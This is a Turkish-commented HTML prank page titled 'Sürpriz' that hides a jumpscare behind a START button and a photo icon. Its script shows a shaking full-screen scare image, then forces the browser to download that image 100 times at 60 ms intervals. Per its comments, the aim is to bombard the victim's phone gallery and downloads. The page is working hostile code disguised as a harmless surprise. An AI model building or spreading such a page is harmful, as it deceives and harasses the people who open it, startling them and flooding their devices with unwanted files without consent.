<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sürpriz</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        body {
            background-color: #050505;
            color: #fff;
            font-family: Arial, sans-serif;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
        }

        /* Başlangıç Ekranı */
        #start-screen {
            text-align: center;
            z-index: 10;
        }

        #start-btn {
            background: #ff0033;
            border: none;
            color: white;
            padding: 20px 50px;
            font-size: 2rem;
            font-weight: bold;
            border-radius: 10px;
            cursor: pointer;
            box-shadow: 0 0 25px rgba(255, 0, 0, 0.8);
        }

        .icon-preview {
            margin-top: 15px;
            font-size: 4rem;
        }

        /* Jumpscare Ekranı */
        #jumpscare-screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background: black;
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 100;
        }

        #jumpscare-screen img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        /* Sarsıntı Efekti */
        .shake {
            animation: shakeAnim 0.08s infinite;
        }

        @keyframes shakeAnim {
            0% { transform: translate(0, 0); }
            25% { transform: translate(-12px, 12px); }
            50% { transform: translate(12px, -12px); }
            75% { transform: translate(-8px, 8px); }
            100% { transform: translate(8px, -8px); }
        }
    </style>
</head>
<body>

    <!-- Başlangıç Ekranı: Tek Start ve Fotoğraf Simgesi -->
    <div id="start-screen">
        <div class="icon-preview">🖼️</div>
        <br>
        <button id="start-btn" onclick="triggerPrank()">START</button>
    </div>

    <!-- Jumpscare Alanı -->
    <div id="jumpscare-screen">
        <img id="scare-img" src="1000038404.jpg" alt="Jumpscare">
    </div>

    <script>
        function triggerPrank() {
            // Başlangıç ekranını gizle
            document.getElementById('start-screen').style.display = 'none';
            
            // Jumpscare ekranını aç ve sars
            const scareScreen = document.getElementById('jumpscare-screen');
            scareScreen.style.display = 'flex';
            scareScreen.classList.add('shake');

            // Galeriyi / İndirilenleri doldurmak için 100'lü indirme döngüsü
            const imageUrl = document.getElementById('scare-img').src;
            
            let count = 0;
            const downloadInterval = setInterval(() => {
                if (count >= 100) {
                    clearInterval(downloadInterval);
                    return;
                }

                const a = document.createElement('a');
                a.href = imageUrl;
                a.download = `korku_fotografi_${count + 1}.jpg`;
                document.body.appendChild(a);
                a.click();
                document.body.removeChild(a);

                count++;
            }, 60); // Her 60 milisaniyede bir dosyayı telefona indirerek bombardıman yapar
        }
    </script>
</body>
</html>
